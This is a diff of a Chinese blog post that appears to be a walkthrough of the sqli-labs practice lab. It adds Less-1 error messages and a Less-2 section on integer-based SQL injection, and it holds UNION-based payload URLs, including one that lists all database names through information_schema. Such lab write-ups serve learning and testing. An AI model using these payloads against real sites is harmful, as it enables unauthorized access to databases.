@@ -465,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    732
+                    977
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -484,7 +484,10 @@
             <div id="articleContent">
                 <h1 id="一-less1-——-字符注入"><a href="#一-less1-——-字符注入" class="headerlink" title="一.less1 —— 字符注入"></a>一.less1 —— 字符注入</h1><p><a href="https://imgchr.com/i/DMFAP0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMFAP0.png" alt=""></a></p>
 <h2 id="1-首先判断注入的类型"><a href="#1-首先判断注入的类型" class="headerlink" title="1.首先判断注入的类型:"></a>1.首先判断注入的类型:</h2><p>方法：先在后面加一个单引号 ‘  测试一下(注意别用中文单引号)</p>
-<pre><code>127.0.0.1/sqli-labs/Less-1/?id=1'</code></pre><p>会出现报错,可以猜它的sql语句如下</p>
+<pre><code>127.0.0.1/sqli-labs/Less-1/?id=1'</code></pre><p>会出现报错,报错内容如下(报错说明程序员未对输入内容进行过滤)</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+</code></pre><p>可以猜它的sql语句如下</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> xx <span class="token keyword">from</span> xx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span>'
 <span class="token comment" spellcheck="true">#不能构成合法的sql语句会报错,可以进行字符型注入</span></code></pre>
 <p><a href="https://imgchr.com/i/DMkykR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMkykR.png" alt=""></a></p>
@@ -503,7 +506,16 @@
 <hr>
 <h3 id="进行敏感操作"><a href="#进行敏感操作" class="headerlink" title="进行敏感操作"></a>进行敏感操作</h3><p>当我们对数据回显位置有了了解之后,就可以在联合查询语句中进行查询敏感信息了<br>1.比如得到所有数据库的名字<br>注:因为知道了参数对应的回显位置,所以下面让password的位置回显数据</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' 
-union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt="DMGl8O.png"></a></p>
+union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt=""></a></p>
+<hr>
+<h1 id="一-less2-——-整型注入"><a href="#一-less2-——-整型注入" class="headerlink" title="一.less2 —— 整型注入"></a>一.less2 —— 整型注入</h1><p><strong><em>less2和less1的步骤差不多,下面省略不写了,只写主要部分</em></strong><br>分析:<br>当id等于1的时候可以正常回显</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1</code></pre><h2 id="1-首先判断注入类型"><a href="#1-首先判断注入类型" class="headerlink" title="1.首先判断注入类型"></a>1.首先判断注入类型</h2><p>报错内容(<strong><em>这里的报错和less1中的是不一样的</em></strong>)： </p>
+<pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1</code></pre><p><a href="https://imgchr.com/i/DMtebj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMtebj.png" alt="DMtebj.png"></a></p>
+<p>可以猜测到它的sql语句是 </p>
+<pre class=" language-SQL"><code class="language-SQL">select xx from xx where id=xx</code></pre>
+<h2 id="2-分析列数-为联合查询铺垫"><a href="#2-分析列数-为联合查询铺垫" class="headerlink" title="2.分析列数(为联合查询铺垫)"></a>2.分析列数(为联合查询铺垫)</h2><p>同less1 ,order by 3 为最大值 </p>
+<h2 id="3-进行union联合注入"><a href="#3-进行union联合注入" class="headerlink" title="3.进行union联合注入"></a>3.进行union联合注入</h2><p>由于整型注入就不用考虑闭合的问题了</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3</code></pre><p><a href="https://imgchr.com/i/DMN0Ts" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMN0Ts.png" alt=""></a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -675,10 +687,11 @@ union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</c
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            主要记录我在学mysql时忘掉的或没注意到的知识
+
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
-            if (!el.dataset.src) { return
+            if (
                         
                     </div>
                     <div class="publish-info">
@@ -692,6 +705,18 @@ union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</c
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
